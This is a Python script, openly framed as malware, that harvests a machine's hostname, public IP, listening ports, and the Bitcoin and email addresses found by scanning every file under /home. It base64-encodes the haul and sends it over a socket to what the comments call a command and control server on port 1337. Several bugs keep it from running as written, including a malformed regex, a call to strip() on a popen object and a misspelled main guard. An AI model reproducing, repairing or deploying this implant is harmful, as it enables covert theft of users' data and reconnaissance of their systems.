##!/usr/bin/python3
#
# python -m pip install requests --use root
import requests
import socket
import base64
import json
import re
import os

def main():
    # Get Hostname of the machine
    hostname = socket.gethostname()
    
    # Get Public IPv4 address of the machine
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
    }
    # curl => TEXT
    # HTTP get req
    public_ip = requests.get("https://ipapi.co/ip", headers = headers).text
    
    # Search for Bitcoin & email addresses
    bitcoin_addresses_list = []
    email_addresses_list = []
    for root, subdirs, files in os.walk("/home"):
        for file in files:
            file_fd = open("{}/{}".format(root, file), "r")
            try:
                # Read the contents of each file
                file_contents = file_fd.read().strip()
                
                # Search for Bitconin addresses
                # Modern bc address: bc1qv7k79qxgwv6wq02zycd5cju4ymgzxw9c3nevft
                # Legacy bc address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
                bitcoin_addresses = re.findall(r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59}})", file_contents)
                
                # Search for email addresses
                email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)
                
                # Check if we have found any Bitcoin addresses or emails
                # filtered by regex
                if len(bitcoin_addresses) > 0:
                    # Append to list
                    bitcoin_addresses_list += bitcoin_addresses
                if len(email_addresses) > 0:
                    email_addresses_list += email_addresses
                
                file_fd.close()
            except:
                pass
            
    # Get all open PORTs on the machine
    open_ports = os.popen("netstat -plant | grep -i listen | awk '{print $4}' | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}")
    # Separating with New lines
    open_ports = open_ports.strip().split("\n")
                        
    # Encode data to json and send them to command & control server
    # as JSON payloads
    data = {
        "machine_hostname": hostname,
        "machine_ip": public_ip,
        "machine_open_ports": open_ports,
        "bitcoin_addresses_found": bitcoin_addresses_list,
        "email_addresses_found": email_addresses_list
    }

    # Base64 encode the JSON data
    encoded_data = base64.b64encode(json.dumps(data).encode())
    
    # Send data to command and control server
    
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to command and control server on port 1337
    s.connect(("127.0.0.1", 1337))
    s.send(encoded_data)
    s.close()

if __name__ == "__main":
    main()
    
            
